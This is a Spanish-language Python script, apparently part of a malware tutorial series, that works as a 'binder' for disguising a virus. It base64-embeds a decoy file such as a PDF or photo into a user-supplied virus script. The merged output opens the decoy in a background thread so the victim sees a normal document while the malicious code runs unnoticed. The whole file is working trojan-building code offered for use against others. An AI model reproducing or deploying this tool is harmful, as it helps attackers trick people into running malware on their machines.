import os
import base64

def empaquetador_file_binder():
    print("=======================================================")
    print("       INYECTOR DE RECURSOS EXTRA / BINDER (SAGA 31)   ")
    print("=======================================================\n")
    
    script_virus = input("Introduce el nombre de tu script virus de Python (.py): ").strip()
    archivo_senuelo = input("Introduce el nombre del archivo señuelo (ej: tarea.pdf o foto.jpg): ").strip()
    
    if not os.path.exists(script_virus) or not os.path.exists(archivo_senuelo):
        print("[ERROR] Uno de los archivos no existe en esta carpeta.")
        return

    print("\n[1/2] Cifrando archivo señuelo en memoria de datos...")
    with open(archivo_senuelo, "rb") as f_sen:
        senuelo_b64 = base64.b64encode(f_sen.read()).decode("utf-8")
        
    with open(script_virus, "r", encoding="utf-8") as f_vir:
        codigo_original = f_vir.read()

    nombre_salida = f"binder_{os.path.basename(script_virus)}"
    nombre_fisico_senuelo = os.path.basename(archivo_senuelo)

    # Inyección de código transitorio para extraer y lanzar el señuelo al inicio
    codigo_fusionado = f'''import base64, os, tempfile, threading

# Datos inyectados del señuelo real
DATA_SENUELO = """{senuelo_b64}"""
NOMBRE_SENUELO = "{nombre_fisico_senuelo}"

def _extraer_y_abrir_senuelo():
    try:
        ruta_temp = os.path.join(tempfile.gettempdir(), NOMBRE_SENUELO)
        with open(ruta_temp, "wb") as f:
            f.write(base64.b64decode(DATA_SENUELO))
        os.startfile(ruta_temp) # Abre el archivo con su programa predeterminado (Adobe, fotos, etc.)
    except:
        pass

# Lanzamos el señuelo en un hilo para no retrasar tu virus de fondo
threading.Thread(target=_extraer_y_abrir_senuelo, daemon=True).start()

# --- CÓDIGO DE TU VIRUS A CONTINUACIÓN ---
{codigo_original}
'''
    with open(nombre_salida, "w", encoding="utf-8") as f_out:
        f_out.write(codigo_fusionado)
        
    print("\n=======================================================")
    print("             ¡ARCHIVOS FUSIONADOS CON ÉXITO!           ")
    print("=======================================================")
    print(f"Nuevo script con señuelo integrado guardado como: {nombre_salida}")
    input("\nPresiona Enter para cerrar...")

if __name__ == "__main__":
    empaquetador_file_binder()
